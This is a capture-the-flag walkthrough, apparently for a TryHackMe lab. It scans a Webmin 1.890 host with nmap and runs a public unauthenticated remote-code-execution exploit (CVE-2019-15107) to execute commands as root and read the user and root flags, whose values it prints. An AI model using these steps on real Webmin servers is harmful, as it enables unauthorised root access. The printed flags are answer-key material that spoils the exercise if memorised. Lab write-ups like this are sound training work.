# Source


1. Enumerate with nmap. We find 2 ports open - 22 and 10000 - with OpenSSH and Webmin running respectively
```
root@ip-10-10-238-190:~# sudo nmap -sS -A -script=vuln 10.10.78.104

Starting Nmap 7.60 ( https://nmap.org ) at 2022-01-04 22:13 GMT
Nmap scan report for ip-10-10-78-104.eu-west-1.compute.internal (10.10.78.104)
Host is up (0.00048s latency).
Not shown: 998 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
10000/tcp open  http    MiniServ 1.890 (Webmin httpd)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-litespeed-sourcecode-download: 
| Litespeed Web Server Source Code Disclosure (CVE-2010-2333)
| /index.php source code:
| <h1>Error - Document follows</h1>
|_<p>This web server is running in SSL mode. Try the URL <a href='https://ip-10-10-78-104.eu-west-1.compute.internal:10000/'>https://ip-10-10-78-104.eu-west-1.compute.internal:10000/</a> instead.<br></p>
|_http-majordomo2-dir-traversal: ERROR: Script execution failed (use -d to debug)
| http-phpmyadmin-dir-traversal: 
|   VULNERABLE:
|   phpMyAdmin grab_globals.lib.php subform Parameter Traversal Local File Inclusion
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2005-3299
|       PHP file inclusion vulnerability in grab_globals.lib.php in phpMyAdmin 2.6.4 and 2.6.4-pl1 allows remote attackers to include local files via the $__redirect parameter, possibly involving the subform array.
|       
|     Disclosure date: 2005-10-nil
|     Extra information:
|       ../../../../../etc/passwd :
|   <h1>Error - Document follows</h1>
|   <p>This web server is running in SSL mode. Try the URL <a href='https://ip-10-10-78-104.eu-west-1.compute.internal:10000/'>https://ip-10-10-78-104.eu-west-1.compute.internal:10000/</a> instead.<br></p>
|   
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3299
|_      http://www.exploit-db.com/exploits/1244/
|_http-server-header: MiniServ/1.890
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
MAC Address: 02:5B:1D:A9:42:D3 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.60%E=4%D=1/4%OT=22%CT=1%CU=36261%PV=Y%DS=1%DC=D%G=Y%M=025B1D%TM
OS:=61D4C6CC%P=x86_64-pc-linux-gnu)SEQ(SP=FE%GCD=1%ISR=10B%TI=Z%CI=Z%TS=A)S
OS:EQ(SP=FE%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M2301ST11NW7%O2=M2301S
OS:T11NW7%O3=M2301NNT11NW7%O4=M2301ST11NW7%O5=M2301ST11NW7%O6=M2301ST11)WIN
OS:(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F50
OS:7%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3
OS:(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=
OS:Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%R
OS:IPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.48 ms ip-10-10-78-104.eu-west-1.compute.internal (10.10.78.104)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 62.18 seconds
```

2. Visit the Webmin page on the web browser `http://<ip address>:10000` and we're redirected to a login page. Let's see if there are any known vulnerabilities for the version of Webmin we're running, `1.890`. Google `webmin exploit` and we find many results. The first result for 1.890 is [this](https://github.com/foxsin34/WebMin-1.890-Exploit-unauthorized-RCE) and links to an [article](https://medium.com/@0xstain/webmin-1-890-exploit-unauthorized-rce-cve-2019-15107-23e4d5a9c3b4). After reading the article we find that the version of Webmin our target is running contains a vulnerability that allows for RCE, and the python script in the git repository will let us exploit it.

3. Clone the repository `git clone https://github.com/foxsin34/WebMin-1.890-Exploit-unauthorized-RCE.git`. Navigate to it and run the python script with `python3 webmin-1.890_exploit.py HOST PORT COMMAND`. Running `python3 webmin-1.890_exploit.py <ip address> 10000 "id"` tells us that we're logged in as root, so we can find both flags easily. To find user.txt use `python3 webmin-1.890_exploit.py <ip address> 10000 "find / -name user.txt 2> /dev/null"` and then print out its contents with `python3 webmin-1.890_exploit.py <ip address> 10000 "cat /home/dark/user.txt"` to get `THM{SUPPLY_CHAIN_COMPROMISE}`. Finally, since we're logged in as root - and assuming that root.txt is in the `/root` directory - we can use `python3 webmin-1.890_exploit.py <ip address> 10000 "cat /root/root.txt"` to get `THM{UPDATE_YOUR_INSTALL}`
